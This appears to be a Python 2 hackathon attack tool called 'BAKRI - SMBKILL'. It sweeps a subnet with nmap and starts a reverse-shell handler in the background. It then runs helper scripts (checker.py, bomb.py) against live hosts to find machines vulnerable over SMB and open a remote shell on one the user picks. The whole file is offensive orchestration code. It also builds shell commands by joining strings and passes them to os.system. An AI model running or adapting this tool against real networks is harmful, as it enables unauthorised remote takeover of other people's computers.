import threading
import sys
import os
import nmap
import time
import socket
import ipaddr


def handler():
    os.system('python tcp_server.py')


if (len(sys.argv) == 1):
    print("Hello user!")
    print("This is help for BAKRI - SMBKILL")
    print(
        "Just type your IP address with prefix or select one from above, after the program name to scan computers in your network")
    print("Example: python hakathon.py 192.168.0.0/24\n")
    print("The program is fully automated and no further input is needed")
    print("It will only ask you again if you want to open SHELL on affected computers :)")


elif (sys.argv[1] == "-h"):
    print("Hello user!")
    print("This is help for BAKRI - SMBKILL")
    print(
        "Just type your IP address with prefix or select one from above, after the program name to scan computers in your network")
    print("Example: python hakathon.py 192.168.0.0/24\n")
    print("The program is fully automated and no further input is needed")
    print("It will only ask you again if you want to open SHELL on affected computers :)")


else:
    try:
        # socket.inet_aton(str(sys.argv[1]).split('/')[0])
        ipaddress = ipaddr.IPAddress(str(sys.argv[1]).split('/')[0])
        os.system("rm file.txt")
        os.system("rm ip.txt")
        if os.name == 'nt':
            os.system("ipconfig | findstr IPv4 >> ip.txt ")
        else:
            os.system("ifconfig | grep ip >> ip.txt")
        with open("ip.txt") as ip:
            ips = ip.readlines()

        print("Listing IPv4 addresses for this computer as reference:")
        for i in ips:
            print(i)

        print ("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ BAKRI - SMBKILL ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        print ("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Realized by PSY ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        print ("")
        print ("[*] Starting services... [*]")
        print ("[*] Starting handler :)  [*]")
        shell_handler = threading.Thread(target=handler)
        shell_handler.start()
        print ("[*] Handler started!!!   [*]\n")

        print ("[*] Scanning targets...  [*]\n")
        nm = nmap.PortScanner()
        nm.scan(hosts=sys.argv[1], arguments='-n -sP')
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]

        found_addresses = []
        print ("\nMachines found :")
        for host, status in hosts_list:
            print(host + ' ' + status)
            if (status == 'up'):
                found_addresses.append(host)


        def checker(address):
            try:
                c = "python checker.py " + address
                os.system(c)
                print ("Scanning complete for ") + address
                print ("\n")
            except:
                print ("Connection Error :(")


        def bomb(address):
            c = "python bomb.py " + address
            os.system(c)
            print ("Nuking complete for " + address)
            print ("\n")


        # print found_addresses
        for address in found_addresses:
            checker(address)

        with open('file.txt') as f:
            vulnerable_addresses = f.readlines()

        i = 0
        print("Shell is available for following computers:")
        for address in vulnerable_addresses:
            print (i, ": ", address)
            i += 1

        # os.system('cat file.txt')
        i = int(raw_input("Press computer number to open its shell:"))
        # total = ''
        # for addr in vulnerable_addresses:
        #    total = total + addr.replace(" \n" , "")

        v_address = vulnerable_addresses[i].replace(" \n", "")
        print("Vadress:" + v_address)

        bomb(v_address)

        time.sleep(10)
        # print "[*][*]Program complete[*][*]"
        # print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ BAKRI - SMBKILL ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
        # print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Realized by PSY ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"

    except ValueError:
        print("Not a valid IP Address")
        print("Valid IP address also contains prefix")
        print("Example: 192.168.0.0/24")
